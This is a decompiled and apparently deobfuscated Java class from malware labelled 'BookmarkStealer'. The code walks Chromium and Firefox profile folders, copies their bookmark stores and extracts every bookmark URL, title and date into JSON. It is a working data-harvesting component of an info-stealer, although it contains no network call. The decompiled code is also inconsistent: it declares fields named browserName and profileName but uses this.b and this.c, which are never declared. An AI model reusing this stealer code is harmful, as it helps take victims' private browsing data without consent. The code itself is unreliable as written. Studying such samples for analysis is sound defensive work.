/* DEOBFUSCATED: BookmarkStealer_Bookmark.java (inner class) */\n\n/*
 * Decompiled with CFR 0.152.
 */
package c;

import c.d;
import c.f;
import c.i;
import c.r;
import c.v$Bookmark;
import java.io.File;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.sql.Connection;
import java.sql.DriverManager;
import java.sql.ResultSet;
import java.sql.Statement;
import java.util.ArrayList;
import java.util.Iterator;
import java.util.List;
import org.json.JSONArray;
import org.json.JSONObject;

public final class v {
    private final List<v$Bookmark> a = new ArrayList<v$Bookmark>();
    private final String browserName;
    private final String profileName;

    public v(f f2) {
        this.b = f2.getBrowser().getInfo().getBrowserName();
        this.c = f2.getDirectory().getName();
        if (f2.getBrowser().getInfo().isFirefox()) {
            this.loadFirefox(f2);
        } else {
            this.loadChromium(f2);
        }
    }

    /*
     * WARNING - Removed try catching itself - possible behaviour change.
     */
    private void loadChromium(f f2) {
        File file = new File(f2.getDirectory(), "Bookmarks");
        if (!file.isFile()) {
            return;
        }
        File file2 = null;
        try {
            JSONObject jSONObject;
            file2 = d.copyToTemp(file);
            String string = Files.readString(file2.toPath(), StandardCharsets.UTF_8);
            if (string.startsWith("\ufeff")) {
                string = string.substring(1);
            }
            if (!(jSONObject = new JSONObject(string)).has("roots")) {
                return;
            }
            JSONObject jSONObject2 = jSONObject.getJSONObject("roots");
            this.walkBookmarkNode(jSONObject2.optJSONObject("bookmark_bar"), "Bookmarks bar");
            this.walkBookmarkNode(jSONObject2.optJSONObject("other"), "Other bookmarks");
            this.walkBookmarkNode(jSONObject2.optJSONObject("synced"), "Mobile bookmarks");
            Iterator<String> iterator = jSONObject2.keys();
            while (iterator.hasNext()) {
                String string2 = iterator.next();
                if ("bookmark_bar".equals(string2) || "other".equals(string2) || "synced".equals(string2)) continue;
                this.walkBookmarkNode(jSONObject2.optJSONObject(string2), "");
            }
        }
        catch (Exception exception) {
            System.err.println("Bookmark load failed for " + this.b + "/" + this.c + ": " + exception.getMessage());
        }
        finally {
            if (file2 != null && file2.exists()) {
                file2.delete();
            }
        }
    }

    private void walkBookmarkNode(JSONObject jSONObject, String string) {
        if (jSONObject == null) {
            return;
        }
        String string2 = jSONObject.optString("type", "");
        if ("url".equals(string2)) {
            this.a.add(new v$Bookmark(jSONObject.optLong("id", 0L), jSONObject.optString("name", ""), string2, jSONObject.optString("url", ""), string, i.chromiumMicrosToIso(jSONObject.optLong("date_added", 0L))));
        }
        if (!jSONObject.has("children")) {
            return;
        }
        JSONArray jSONArray = jSONObject.optJSONArray("children");
        if (jSONArray == null) {
            return;
        }
        String string3 = jSONObject.optString("name", string);
        for (int i2 = 0; i2 < jSONArray.length(); ++i2) {
            JSONObject jSONObject2 = jSONArray.optJSONObject(i2);
            if (jSONObject2 == null) continue;
            this.walkBookmarkNode(jSONObject2, string3);
        }
    }

    /*
     * WARNING - Removed try catching itself - possible behaviour change.
     */
    private void loadFirefox(f f2) {
        File file = new File(f2.getDirectory(), "places.sqlite");
        if (!file.isFile()) {
            return;
        }
        File file2 = null;
        try {
            Class.forName("org.sqlite.JDBC");
            file2 = d.copyToTemp(file);
            try (Connection connection = DriverManager.getConnection("jdbc:sqlite:" /* r.sq() */ + file2.getAbsolutePath());
                 Statement statement = connection.createStatement();
                 ResultSet resultSet = statement.executeQuery("SELECT b.id, b.title, p.url, b.dateAdded FROM moz_bookmarks b INNER JOIN moz_places p ON b.fk = p.id WHERE b.type = 1");){
                while (resultSet.next()) {
                    this.a.add(new v$Bookmark(resultSet.getLong("id"), resultSet.getString("title"), "url", resultSet.getString("url"), "Bookmarks", i.chromiumMicrosToIsoFromUnixSeconds(resultSet.getLong("dateAdded") / 1000000L)));
                }
            }
        }
        catch (Exception exception) {
            System.err.println("Firefox bookmark load failed for " + this.b + "/" + this.c + ": " + exception.getMessage());
        }
        finally {
            if (file2 != null && file2.exists()) {
                file2.delete();
            }
        }
    }

    public int getCount() {
        return this.a.size();
    }

    public JSONArray toJsonArray() {
        JSONArray jSONArray = new JSONArray();
        for (v$Bookmark v$Bookmark : this.a) {
            jSONArray.put(v$Bookmark.toJson(this.b, this.c));
        }
        return jSONArray;
    }
}

